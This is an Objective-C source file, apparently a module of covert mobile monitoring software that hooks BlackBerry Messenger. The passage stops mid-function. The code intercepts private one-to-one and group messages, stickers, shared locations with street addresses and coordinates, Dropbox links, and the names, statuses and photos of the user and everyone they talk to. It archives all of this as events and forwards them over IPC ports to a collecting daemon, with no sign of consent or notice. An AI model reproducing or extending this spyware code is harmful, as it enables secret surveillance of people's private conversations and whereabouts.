//
//  BBMUtils.m
//  MSFSP
//
//  Created by Ophat Phuetkasickonphasutha on 11/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "BBMUtils.h"
#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxVoIPEvent.h"
#import "FxIMGeoTag.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "StringUtils.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import "DateTimeFormat.h"
#import "FxRecipient.h"
#import "IMShareUtils.h"

#import "BBMCoreAccess.h"
#import "BBMCoreAccess+2-1-0.h"
#import "BBMConversation.h"
#import "BBMCommonConversation.h"
#import "BBMUser.h"
#import "BBMStickerImage.h"
#import "BBMGenMessage.h"
#import "BBMGenMessage+2-1-0.h"
#import "BBMMessage.h"
#import "BBMMessage+2-1-0.h"
#import "BBMGenSticker.h"
#import "BBMSticker.h"
#import "BBMStickerImageCriteria.h"
#import "BBMDSGeneratedModel.h"
#import "BBMDSGeneratedModel+2-1-0.h"
#import "BBMLocation.h"
#import "DBChooserResult.h"
#import "BBMCoreAccessGroup.h"
#import "BBMLiveList.h"
#import "BBGGenGroupConversation.h"
#import "BBGGroupConversation.h"
#import "BBGGenGroup.h"
#import "BBGGroup.h"
#import "BBGGenGroupMember.h"
#import "BBGGroupMember.h"
#import "BBGGenGroupContact.h"
#import "BBGGroupContact.h"

#import <objc/runtime.h>

static BBMUtils *_BBMUtils = nil;

@interface BBMUtils (private)
- (void) thread: (FxIMEvent *) aFxIMEvent;

+ (void) captureStickerWithArgs: (NSArray *) aArgs;
+ (void) captureOutgoingSharedLocation: (NSArray *) aArgs;
+ (void) captureGroupChatMessage: (NSArray *) aArgs;
+ (NSArray *) getOutgoingEventsWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                               withConversations: (NSArray *) aConversations;
+ (FxIMEvent *) getEventFromBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                      groupUri: (NSString *) aGroupUri
                                     senderUri: (NSString *) aSenderUri
                                    isOutgoing: (NSNumber *) aIsOutgoing;

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;
@end

@implementation BBMUtils

@synthesize mIMSharedFileSender;
@synthesize mIMSharedFileSender1;
@synthesize mIMSharedFileSender2;
@synthesize mBBMUtilsTimestamp;

+ (id) sharedBBMUtils{
	if (_BBMUtils == nil) {
		_BBMUtils = [[BBMUtils alloc] init];
        
        if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kBBMMessagePort];
			[_BBMUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
            
            sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kBBMMessagePort1];
			[_BBMUtils setMIMSharedFileSender1:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
            
            sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kBBMMessagePort2];
			[_BBMUtils setMIMSharedFileSender2:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
            
        }
	}
	return (_BBMUtils);
}

- (id) init {
    if ((self = [super init])) {
        NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentPath = [searchPaths objectAtIndex:0];
        NSString *capturedIdentifierPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"bmmmsgidentifiers.plist"];
        NSDictionary *capturedIdentifierInfo = [NSDictionary dictionaryWithContentsOfFile:capturedIdentifierPath];
        NSArray *identifiers = [capturedIdentifierInfo objectForKey:@"identifiers"];
        if (identifiers == nil) {
            mCapturedBMMMessageIdentifers = [[NSMutableArray alloc] init];
        } else {
            mCapturedBMMMessageIdentifers = [[NSMutableArray alloc] initWithArray:identifiers];
        }
        //DLog(@"capturedIdentifierPath = %@", capturedIdentifierPath);
        //DLog(@"capturedIdentifierInfo = %@", capturedIdentifierInfo);
    }
    return (self);
}

+ (void) sendBBMEvent: (FxIMEvent *) aIMEvent {
	BBMUtils *imBBMUtils = [[BBMUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:) toTarget:imBBMUtils withObject:aIMEvent];
	[imBBMUtils release];
}

+ (void) captureOutgoingStickerWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                   withStickerID: (NSString *) aStickerID
                             withConversationIDs: (NSArray *) aConversationIDs {
    NSArray *events = [self getOutgoingEventsWithBBMCoreAccess:aBBMCoreAccess withConversations:aConversationIDs];
    
    NSArray *args = [NSArray arrayWithObjects:aBBMCoreAccess, aStickerID, aConversationIDs, events, nil];
    [NSThread detachNewThreadSelector:@selector(captureStickerWithArgs:)
                             toTarget:[self class]
                           withObject:args];
}

+ (void) captureIncomingStickerWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                   withStickerID: (NSString *) aStickerID
                             withConversationIDs: (NSArray *) aConversationIDs
                                         IMEvent: (FxIMEvent *) aIMEvent {
    NSArray *events = [NSArray arrayWithObject:aIMEvent];
    for (FxIMEvent *imEvent in events) {
        [imEvent setMDirection:kEventDirectionIn];
    }
    
    NSArray *args = [NSArray arrayWithObjects:aBBMCoreAccess, aStickerID, aConversationIDs, events, nil];
    [NSThread detachNewThreadSelector:@selector(captureStickerWithArgs:)
                             toTarget:[self class]
                           withObject:args];
}

+ (void) captureOutgoingGlympseWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                  withGlympseMsg: (NSString *) aGlympseMsg
                             withConversationIDs: (NSArray *) aConversationIDs {
    NSArray *events = [self getOutgoingEventsWithBBMCoreAccess:aBBMCoreAccess withConversations:aConversationIDs];
    for (FxIMEvent *imEvent in events) {
        [imEvent setMRepresentationOfMessage:kIMMessageText];
        [imEvent setMMessage:aGlympseMsg];
        
        [self sendBBMEvent:imEvent];
    }
}

+ (void) captureOutgoingDropboxWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                             withConversationIDs: (NSArray *) aConversationIDs
                                 dbChooserResult: (DBChooserResult *) aChooserResult
                                         caption: (NSString *) aCaption {
    NSArray *events = [self getOutgoingEventsWithBBMCoreAccess:aBBMCoreAccess withConversations:aConversationIDs];
    for (FxIMEvent *imEvent in events) {
        [imEvent setMRepresentationOfMessage:kIMMessageText];
        
        DLog(@"thumbnails = %@", [aChooserResult thumbnails]);
        DLog(@"iconURL = %@", [aChooserResult iconURL]);
        DLog(@"size = %llu", [aChooserResult size]);
        DLog(@"name = %@", [aChooserResult name]);
        DLog(@"link = %@", [aChooserResult link]);
        
        NSString *message = [NSString stringWithFormat:@"%@ %@", aCaption, [[aChooserResult link] absoluteString]];
        [imEvent setMMessage:message];
        
        [self sendBBMEvent:imEvent];
    }
}

+ (void) captureOutgoingSharedLocationWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                                            withJSONMsg: (NSString *) aJSONMsg {
    NSArray *args = [NSArray arrayWithObjects:aBBMCoreAccess, aJSONMsg, nil];
    [NSThread detachNewThreadSelector:@selector(captureOutgoingSharedLocation:)
                             toTarget:[self class]
                           withObject:args];
}

+ (FxIMGeoTag *) locationFromBBMLocation: (BBMLocation *) aBBMLocation {
    BBMLocation *bbmLocation = aBBMLocation;
    DLog(@"bbmLocation = %@", bbmLocation);
    if ([bbmLocation respondsToSelector:@selector(getName)]) {
        DLog(@"getName = %@", [bbmLocation getName]);
    } else if ([bbmLocation respondsToSelector:@selector(getObjectName)]) {       
        DLog(@"objectName = %@", [bbmLocation getObjectName]);   // e.g., Central World Department Store
    }
    DLog(@"getUiId = %@", [bbmLocation getUiId]);
    DLog(@"getStreet = %@", [bbmLocation getStreet]);
    DLog(@"getIdentifier = %@", [bbmLocation getIdentifier]);
    DLog(@"getPostalCode = %@", [bbmLocation getPostalCode]);
    DLog(@"getState = %@", [bbmLocation getState]);
    DLog(@"getCity = %@", [bbmLocation getCity]);
    DLog(@"getCountry = %@", [bbmLocation getCountry]);
    
    FxIMGeoTag *sharedLocation = [[FxIMGeoTag alloc] init];
    [sharedLocation setMLongitude:[[bbmLocation getLongitude] floatValue]];
    [sharedLocation setMLatitude:[[bbmLocation getLatitude] floatValue]];
    [sharedLocation setMAltitude:[[bbmLocation getAltitude] floatValue]];
    [sharedLocation setMAltitude:[[bbmLocation getAltitude] floatValue]];
    [sharedLocation setMHorAccuracy:[[bbmLocation getHorizontalAccuracy] floatValue]];
    // Street + City + State + Country + PostalCode (Thanon Ratchaprarop 82/20 + ถนนพญาไท + Bangkok + Thailand + 10400)
    NSMutableArray *places = [NSMutableArray array];
    if ([bbmLocation getStreet] != nil) [places addObject:[bbmLocation getStreet]];
    if ([bbmLocation getCity] != nil) [places addObject:[bbmLocation getCity]];
    if ([bbmLocation getState] != nil) [places addObject:[bbmLocation getState]];
    if ([bbmLocation getCountry] != nil) [places addObject:[bbmLocation getCountry]];
    if ([bbmLocation getPostalCode] != nil) [places addObject:[bbmLocation getPostalCode]];
    NSString *placeName = [places componentsJoinedByString:@" "];
    [sharedLocation setMPlaceName:placeName];
    return ([sharedLocation autorelease]);
}

+ (void) captureOutgoingGroupChatWithBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                                message: (NSString *) aMessage
                                               groupUri: (NSString *) aGroupUri {
    /*** Not implement ***/
}

+ (void) captureGroupChatWithBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                    messageType: (NSString *) aMessageType
                                    messageInfo: (NSDictionary *) aMessageInfo
                                       groupUri: (NSString *) aGroupUri {
    if ([aMessageType isEqualToString:@"groupMessage"] && aGroupUri != nil) {
        
        NSArray *args = [NSArray arrayWithObjects:aBBMCoreAccessGroup,
                         aMessageType,
                         aMessageInfo,
                         aGroupUri, nil];
        [NSThread detachNewThreadSelector:@selector(captureGroupChatMessage:)
                                 toTarget:[self class]
                               withObject:args];
    }
}

- (void) saveCapturedBBMMessageIdentifier: (NSString *) aIdentifier {
    [mCapturedBMMMessageIdentifers insertObject:aIdentifier atIndex:0];
    if ([mCapturedBMMMessageIdentifers count] > 30) {
        [mCapturedBMMMessageIdentifers removeObjectAtIndex:30];
    }
    NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentPath = [searchPaths objectAtIndex:0];
    NSString *capturedIdentifierPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"bmmmsgidentifiers.plist"];
    NSDictionary *capturedIdentifierInfo = [NSDictionary dictionaryWithObject:mCapturedBMMMessageIdentifers
                                                                       forKey:@"identifiers"];
    [capturedIdentifierInfo writeToFile:capturedIdentifierPath atomically:YES];
    //DLog(@"capturedIdentifierPath = %@", capturedIdentifierPath);
    //DLog(@"capturedIdentifierInfo = %@", capturedIdentifierInfo);
}

- (BOOL) isBBMMessageIdentifierCaptured: (NSString *) aIdentifier {
    DLog(@"mCapturedBMMMessageIdentifers = %@", mCapturedBMMMessageIdentifers)
    
    /*
     As before we have used NSNumber of identifier to store in plist and as of now
     we use NSString of globallyUniqueId to store in plist so in order to maintain
     backward compatibility we need to check class type of object in plist before we compare
     */
    
    for (id identifier in mCapturedBMMMessageIdentifers) {
        if ([identifier isKindOfClass:[NSNumber class]]) {
            if ([[identifier description] isEqualToString:aIdentifier]) {
                return (YES);
            }
        } else if ([identifier isKindOfClass:[NSString class]]) {
            if ([identifier isEqualToString:aIdentifier]) {
                return (YES);
            }
        }
    }
    return (NO);
}

#pragma mark - Private methods -

- (void) thread: (FxIMEvent *) aFxIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	@try {
		
		FxIMEvent *imEvent = aFxIMEvent;
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[imEvent mMessage]];
		DLog(@"BBM imEvent = %@", imEvent);
		DLog(@"BBM message after remove emoji = %@", msg);
		
		if (([msg length]>0) || ([[imEvent mAttachments]count]>0) || ([imEvent mShareLocation]!=nil) ) {
			
			[imEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			[archiver encodeObject:imEvent forKey:kBBMArchied];
			[archiver finishEncoding];
			[archiver release];	
			
			BOOL successfullySend = NO;
			successfullySend = [BBMUtils sendDataToPort:data portName:kBBMMessagePort];
			if (!successfullySend) {
				DLog (@"=========================================")
				DLog (@"************ successfullySend failed 1");
				DLog (@"=========================================")
				successfullySend = [BBMUtils sendDataToPort:data portName:kBBMMessagePort1];
				if (!successfullySend) {
					DLog (@"=========================================")
					DLog (@"************ successfullySend failed 2");
					DLog (@"=========================================")
					successfullySend = [BBMUtils sendDataToPort:data portName:kBBMMessagePort2];
					if (!successfullySend) {
						DLog (@"=========================================")
						DLog (@"************ successfullySend failed 3");
						DLog (@"=========================================")
					}
				}
			}
			
			if (!successfullySend) {
				[self deleteAttachmentFileAtPathForEvent:[imEvent mAttachments]];
			}
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (void) captureStickerWithArgs: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[aArgs retain];
    
	@try {
        BBMCoreAccess *aBBMCoreAccess   = [aArgs objectAtIndex:0];
        NSString *aStickerID            = [aArgs objectAtIndex:1];
        NSArray *aConversationIDs       = [aArgs objectAtIndex:2];
        NSArray *events                 = [aArgs objectAtIndex:3];
        DLog(@"aSticker = %@", aStickerID);
        
        NSInteger convsIndex = 0;
        for (NSString *convsUri in aConversationIDs) {
            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
            
            NSData *stickerData = nil;
            BBMStickerImage *bbmStickerImage = nil;
            
            while (bbmStickerImage == nil) {
                [NSThread sleepForTimeInterval:1.0];
                
                bbmStickerImage = [aBBMCoreAccess getStickerImage:aStickerID];
                DLog(@"bbmStickerImage = %@", bbmStickerImage);
            }
            
            NSDictionary *bundleInfo    = [[NSBundle mainBundle] infoDictionary];
            NSString *versionOfIM       = [bundleInfo objectForKey:@"CFBundleShortVersionString"];

            if ([IMShareUtils isVersionText:versionOfIM isLessThan:@"2.2"]) {
                if (bbmStickerImage != nil) {
                    stickerData = UIImagePNGRepresentation([bbmStickerImage getImage]);
                } else {
                    NSURL *stickerUrl = nil;
                    /*
                     // Alternative 1:
                     // ############# BBM version > 2.0 #################
                     BBMConversation * bbmC  = [aBBMCoreAccess getConversationForURI:convsUri];
                     BBMMessage *resolvedMessage = [bbmC resolvedLastMessage];
                     BBMSticker *resolvedSticker = [resolvedMessage resolvedStickerId];
                     
                     NSInteger breaker = 0;
                     while (![[resolvedSticker getIdentifier] isEqualToString:aStickerID]) {
                     
                     if (breaker > 3) {
                     resolvedSticker = nil;
                     DLog(@"I need to break...");
                     break;
                     }
                     breaker++;
                     
                     [NSThread sleepForTimeInterval:0.5];
                     
                     bbmC  = [aBBMCoreAccess getConversationForURI:convsUri];
                     resolvedMessage = [bbmC resolvedLastMessage];
                     resolvedSticker = [resolvedMessage resolvedStickerId];
                     }
                     
                     DLog(@"resolvedMessage = %@", resolvedMessage);
                     DLog(@"resolvedSticker = %@", resolvedSticker);
                     DLog(@"_iconUrl = %@", [resolvedSticker getIconUrl]);
                     
                     // file:///var/mobile/Applications/AB936428-3231-452A-AB1B-229CE1B05152/Library/bbmcore/stickers/1/icons/20
                     // file:///var/mobile/Applications/AB936428-3231-452A-AB1B-229CE1B05152/Library/bbmcore/stickers/1/images/20
                     
                     NSString *iconUrl = [resolvedSticker getIconUrl];
                     iconUrl = [iconUrl stringByReplacingOccurrencesOfString:@"icons" withString:@"images"];
                     stickerUrl = [NSURL URLWithString:iconUrl];
                     */
                    
                    /*
                     // Alternative 2:
                     // *** Cannot get Url from Sticker image object thus try to wait ***
                     BBMDSGeneratedModel *coreModel = [aBBMCoreAccess coreModel];
                     Class $BBMStickerImage = objc_getClass("BBMStickerImage");
                     bbmStickerImage = [$BBMStickerImage elementWithIdentifier:aStickerID andParent:[coreModel global]];
                     DLog(@"Search, bbmStickerImage = %@", bbmStickerImage);
                     stickerUrl = [NSURL URLWithString:[bbmStickerImage getUrl]];
                     NSInteger breaker = 0;
                     while (stickerUrl == nil) {
                     if (breaker > 3) {
                     DLog(@"I need to break...");
                     break;
                     }
                     breaker++;
                     
                     [NSThread sleepForTimeInterval:1.0];
                     stickerUrl = [NSURL URLWithString:[bbmStickerImage getUrl]];
                     }
                     */
                    
                    stickerData = [NSData dataWithContentsOfURL:stickerUrl];
                    UIImage *stickerImage = [UIImage imageWithData:stickerData];
                    stickerData = UIImagePNGRepresentation(stickerImage);
                    
                    DLog(@"stickerUrl = %@", stickerUrl);
                    DLog(@"stickerImage = %@", stickerImage);
                    DLog(@"stickerData = %lu", (unsigned long)[stickerData length]);
                }
            } else {
                DLog(@"For BBM version 2.2.0.19 up")
                NSURL *stickerUrl    = [NSURL URLWithString:[bbmStickerImage getUrl]];
            

                stickerData = [NSData dataWithContentsOfURL:stickerUrl];
                
                DLog(@"stickerUrl   = %@", stickerUrl);
                DLog(@"stickerData  = %lu", (unsigned long)[stickerData length]);
            }
            
            DLog(@"========= bbmStickerImage ==========");
            DLog(@"getUrl = %@", [bbmStickerImage getUrl]);
            DLog(@"getInternalStickerId = %@", [bbmStickerImage getInternalStickerId]);
            DLog(@"getIdentifier = %@", [bbmStickerImage getIdentifier]);
            DLog(@"getExternalId = %@", [bbmStickerImage getExternalId]);
            if ([bbmStickerImage respondsToSelector:@selector(getDescription)]) {
                // This method no longer exist in 2.4.0
                DLog(@"getDescription = %@", [bbmStickerImage getDescription]);
            }
            DLog(@"========= bbmStickerImage ==========");
            
            if (stickerData != nil) {
                FxIMEvent *imEvent = [events objectAtIndex:convsIndex];
                
                FxAttachment *attachment = [[FxAttachment alloc] init];
                [attachment setFullPath:nil];
                [attachment setMThumbnail:stickerData];
                
                [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [imEvent setMRepresentationOfMessage:kIMMessageSticker];
                
                [attachment release];
                
                [BBMUtils sendBBMEvent:imEvent];
            }
            
            [pool release];
            convsIndex++;
        }
    } @catch (...) {
        DLog(@"Exception in sticker capture thread ...");
    }
    
    [aArgs release];
    [pool release];
}

+ (void) captureOutgoingSharedLocation: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[aArgs retain];
    
	@try {
        BBMCoreAccess *bbmCoreAccess    = [aArgs objectAtIndex:0];
        NSString *jsonMsg               = [aArgs objectAtIndex:1];
        
        NSData *jsonData = [jsonMsg dataUsingEncoding:NSUTF8StringEncoding];
        NSError *error = nil;
        id jsonObject = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:&error];
        DLog(@"error = %@", error);
        //DLog(@"jsonObject = %@", jsonObject);
        
        /*
         jsonObject = {
            locationSend =     {
                to =         (
                    "bbmpim://conversation/wuhknkne"
                );
                uiId = "c5e2626e-428e-41ec-a7b1-c62251022f3f";
            };
         }
         */
        
        if (!error) {
            NSArray *to = nil;
            NSString *uiId = nil;
            
            NSDictionary *jsonInfo = jsonObject;
            NSArray *allKeys = [jsonInfo allKeys];
            for (NSString *key in allKeys) {
                if ([key isEqualToString:@"locationSend"]) {
                    NSDictionary *locationSendInfo = [jsonInfo objectForKey:key];
                    to = [locationSendInfo objectForKey:@"to"];
                    uiId = [locationSendInfo objectForKey:@"uiId"];
                    break;
                }
            }
            DLog(@"to = %@, uiId = %@", to, uiId);
            
            if (to != nil && uiId != nil) {
                BBMLocation *bbmLocation = nil;
                
                while (true) {
                    NSArray *bbmLocations = [bbmCoreAccess getLocations];
                    for (BBMLocation *loc in bbmLocations) {
                        if ([[loc getUiId] isEqualToString:uiId]) {
                            bbmLocation = loc;
                            break;
                        }
                    }
                    
                    if (bbmLocation == nil) {
                        // If location is newly added to recent locations, first search will get nil so just wait abit
                        DLog(@"Sleep for newly added location completed");
                        [NSThread sleepForTimeInterval:2.0];
                    } else {
                        break;
                    }
                }
                
                if (bbmLocation != nil) {
                    NSArray *events = [self getOutgoingEventsWithBBMCoreAccess:bbmCoreAccess withConversations:to];
                    for (FxIMEvent *imEvent in events) {
                        [imEvent setMRepresentationOfMessage:kIMMessageShareLocation];
                        FxIMGeoTag *sharedLocation = [self locationFromBBMLocation:bbmLocation];
                        [imEvent setMShareLocation:sharedLocation];
                        
                        [BBMUtils sendBBMEvent:imEvent];
                    }
                }
            }
        } else {
            DLog(@"Parse json msg error, %@", error);
        }
    } @catch (...) {
        DLog(@"Exception in outgoing shared location capture thread ...");
    }
    [aArgs release];
    [pool release];
}

+ (void) captureGroupChatMessage: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[aArgs retain];
    
	@try {
        BBMCoreAccessGroup *bbmCoreAccessGroup = [aArgs objectAtIndex:0];
        //NSString *messageType = [aArgs objectAtIndex:1];
        NSDictionary *messageInfo = [aArgs objectAtIndex:2];;
        NSString *groupUri = [aArgs objectAtIndex:3];
        
        // Message dictionary (messageInfo), below 2.6.1
        /*
         {
            listAdd =     {
                elements =         (
                    {
                    incoming = 1;
                    message = Terror;
                    messageId = "145889b630d/7424aceb";
                    senderUri = "bbgpim://groupContact/7424ACEB";
                    timestamp = 1398156256;
                }
            );
            id = "bbgpim://conversation/1-%e2%80%8bGeneral%20Discussion";
            type = groupMessage;
            };
         }
         */
        
        DLog(@"messageInfo = %@", messageInfo);
        
        // Message dictionary (messageInfo), 2.6.1
        /*
         {
            listAdd =     {
                elements =         (
                    {
                    incoming = 0;
                    message = "Sticker received";
                    messageId = "14ac3dd7c8c/7eea36c3";
                    senderUri = "bbgpim://groupContact/7EEA36C3";
                    stickerId = 24;
                    timestamp = 1420625280;
                    type = Sticker;
                }
            );
            id = "bbgpim://conversation/2-%e2%80%8bGeneral%20Discussion";
            type = groupMessage;
            };
         }
         */
        
        NSDictionary *listAddInfo   = [messageInfo objectForKey:@"listAdd"];
        NSArray *elements           = [listAddInfo objectForKey:@"elements"];
        if ([elements count] > 0) {
            NSDictionary *elementsInfo  = [elements objectAtIndex:0];
            NSString *senderUri         = [elementsInfo objectForKey:@"senderUri"];
            NSString *message           = [elementsInfo objectForKey:@"message"];
            NSNumber *incoming          = [elementsInfo objectForKey:@"incoming"];
            DLog(@"incoming, %@, %@", [incoming class], incoming);
            
            BOOL isOutgoing             = ![incoming boolValue];
            DLog(@"isOutgoing = %d", isOutgoing);
            NSString *stickerId         = [elementsInfo objectForKey:@"stickerId"];
            
            FxIMEvent *imEvent = [self getEventFromBBMCoreAccessGroup:bbmCoreAccessGroup
                                                             groupUri:groupUri
                                                            senderUri:senderUri
                                                           isOutgoing:[NSNumber numberWithBool:isOutgoing]];
            
            if (imEvent != nil) {
                // Text
                [imEvent setMRepresentationOfMessage:kIMMessageText];
                [imEvent setMMessage:message];
                
                // Sticker
                if (stickerId) {
                    NSUInteger breaker = 0;
                    BBMStickerImage *bbmStickerImage = nil;
                    while (bbmStickerImage == nil && breaker <= 5) {
                        [NSThread sleepForTimeInterval:1.0];
                        
                        Class $BBMCoreAccess = objc_getClass("BBMCoreAccess");
                        BBMCoreAccess *bbmCoreAccess = [$BBMCoreAccess sharedInstance];
                        bbmStickerImage = [bbmCoreAccess getStickerImage:stickerId];
                        DLog(@"bbmStickerImage = %@", bbmStickerImage);
                        
                        breaker++;
                    }
                    
                    NSURL *stickerUrl = [NSURL URLWithString:[bbmStickerImage getUrl]];
                    NSData *stickerData = [NSData dataWithContentsOfURL:stickerUrl];
                    DLog(@"stickerUrl   = %@", stickerUrl);
                    DLog(@"stickerData  = %lu", (unsigned long)[stickerData length]);
                    
                    if (stickerData != nil) {
                        FxAttachment *attachment = [[FxAttachment alloc] init];
                        [attachment setFullPath:nil];
                        [attachment setMThumbnail:stickerData];
                        [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                        [imEvent setMRepresentationOfMessage:kIMMessageSticker];
                        [attachment release];
                    }
                }
                
                [self sendBBMEvent:imEvent];
            }
        }
    } @catch (...) {
        DLog(@"Exception in group chat capture thread ...");
    }
    [aArgs release];
    [pool release];
}

+ (NSArray *) getOutgoingEventsWithBBMCoreAccess: (BBMCoreAccess *) aBBMCoreAccess
                               withConversations: (NSArray *) aConversations {
    NSMutableArray * events     = [NSMutableArray array];
    
    @try {
        NSString * message          = nil;
        NSString * imServiceID		= @"BBM";
        NSString * myName			= nil;
        NSString * myID				= nil;
        NSString * myStatus			= nil;
        NSData   * myPhoto			= nil;
        NSString * convName			= nil;
        NSString * convID			= nil;
        NSArray  * listOfResolvedParticipants = nil;
        NSData   * convPhoto		= nil;
        
        NSArray * multipleConversations = aConversations;
        for (int i=0; i<[multipleConversations count]; i++) {
            FxIMEvent *imEvent			 = [[FxIMEvent alloc] init];
            NSMutableArray *participants = [[NSMutableArray alloc] init];
            
            if ([aBBMCoreAccess respondsToSelector:@selector(getConversationForURI:)]) {
                DLog(@"############# BBM version > 2.0 #################");
                BBMConversation * bbmC  = [aBBMCoreAccess getConversationForURI:[multipleConversations objectAtIndex:i]];
                convName                = [bbmC conversationTitle];
                convID                  = [bbmC conversationUri];
                listOfResolvedParticipants = [[NSArray alloc] initWithArray:[bbmC resolvedParticipants]];
            }else{
                DLog(@"############# BBM old version < 2.0 #################");
                Class $BBMCommonConversation    = objc_getClass("BBMCommonConversation");
                BBMCommonConversation * bbmC    = [$BBMCommonConversation conversationWithURI:[multipleConversations objectAtIndex:i]];
                convName                        = [bbmC title];
                convID                          = [bbmC conversationUri];
                listOfResolvedParticipants = [[NSArray alloc] initWithArray:[bbmC resolvedParticipants]];
            }
            
            BBMUser * user = [aBBMCoreAccess currentUser];
            
            myName      = [user getDisplayName];
            myID		= [user getUri];
            myStatus	= [user getCurrentStatus];
            myPhoto		= [NSData dataWithContentsOfFile:[user avatarImagePath]];
            
            DLog(@"Type : Uknown | Direction : Outgoing");
            DLog(@"ConversationID: %@",convID);
            DLog(@"ConversationName %@",convName);
            DLog(@"UserID: %@",[user getUri]);
            DLog(@"UserName: %@",[user getDisplayName]);
            DLog(@"UserCurrentStatus: %@",[user getCurrentStatus]);
            DLog(@"UserLocation: %@",[user getLocation]);
            DLog(@"UserAvatarImagePath: %@",[user avatarImagePath]);
            DLog(@"Message: %@",message);
            
            for (int i =0; i<[listOfResolvedParticipants count]; i++) {
                BBMUser * target = [listOfResolvedParticipants objectAtIndex:i];
                
                DLog(@"======================== %d",i);
                DLog(@"TargetID: %@",[target getUri]);
                DLog(@"TargetName: %@",[target getDisplayName]);
                DLog(@"TargetCurrentStatus: %@",[target getCurrentStatus]);
                DLog(@"TargetLocation: %@",[target getLocation]);
                DLog(@"TargetAvatarImagePath: %@",[target avatarImagePath]);
                
                FxRecipient *participant = [[FxRecipient alloc] init];
                [participant setRecipNumAddr:[target getUri]];
                [participant setMPicture:[NSData dataWithContentsOfFile:[target avatarImagePath]]];
                [participant setRecipContactName:[target getDisplayName]];
                [participant setMStatusMessage:[target getCurrentStatus]];
                [participants addObject:participant];
                [participant release];
            }
            
            [imEvent setMDirection:kEventDirectionOut];
            [imEvent setMRepresentationOfMessage:kIMMessageNone];
            [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
            [imEvent setMIMServiceID:imServiceID];
            [imEvent setMServiceID:kIMServiceBBM];
            [imEvent setMUserID:myID];
            [imEvent setMUserDisplayName:myName];
            [imEvent setMUserStatusMessage:myStatus];
            [imEvent setMUserPicture:myPhoto];
            [imEvent setMParticipants:participants];
            [imEvent setMConversationID:convID];
            [imEvent setMConversationName:convName];
            [imEvent setMConversationPicture:convPhoto];
            [imEvent setMMessage:message];
            [imEvent setMAttachments:nil];
            
            [listOfResolvedParticipants release];
            [participants release];
            [events addObject:imEvent];
            [imEvent release];
        }

    }
    @catch (NSException *exception) {
        DLog(@"BBM Exception %@", exception);
    }
    @finally {
        ;
    }
    return (events);
}

+ (FxIMEvent *) getEventFromBBMCoreAccessGroup: (BBMCoreAccessGroup *) aBBMCoreAccessGroup
                                      groupUri: (NSString *) aGroupUri
                                     senderUri: (NSString *) aSenderUri
                                    isOutgoing: (NSNumber *) aIsOutgoing {
    DLog(@"############# Args #################");
    DLog(@"aBBMCoreAccessGroup = %@", aBBMCoreAccessGroup);
    DLog(@"aGroupUri = %@", aGroupUri);
    DLog(@"aSenderUri = %@", aSenderUri);
    DLog(@"aIsOutgoing = %@", aIsOutgoing);
    DLog(@"############# Args #################");
    
    NSString * message          = nil;
	NSString * imServiceID		= @"BBM";
    NSString * senderName		= nil;
	NSString * senderID			= nil;
	NSString * senderStatus		= nil;
	NSData   * senderPhoto		= nil;
	NSString * convName			= nil;
	NSString * convID			= nil;
    NSData   * convPhoto		= nil;
    NSArray  * listOfResolvedParticipants = nil;
    FxEventDirection direction  = kEventDirectionUnknown;
    
    Class $BBMCoreAccess = objc_getClass("BBMCoreAccess");
    BBMCoreAccess *bbmCoreAccess = [$BBMCoreAccess sharedInstance];
    
    NSArray * multipleConversations = [bbmCoreAccess getGroupConversations];
    //NSArray *multipleGroups = [bbmCoreAccess getGroups];
    
    DLog(@"multipleConversations = %@", multipleConversations);
    //DLog(@"multipleGroups = %@", multipleGroups);
    
    FxIMEvent *imEvent = nil;
    
    if ([aIsOutgoing boolValue]) {
        direction = kEventDirectionOut;
    } else {
        direction = kEventDirectionIn;
    }
    
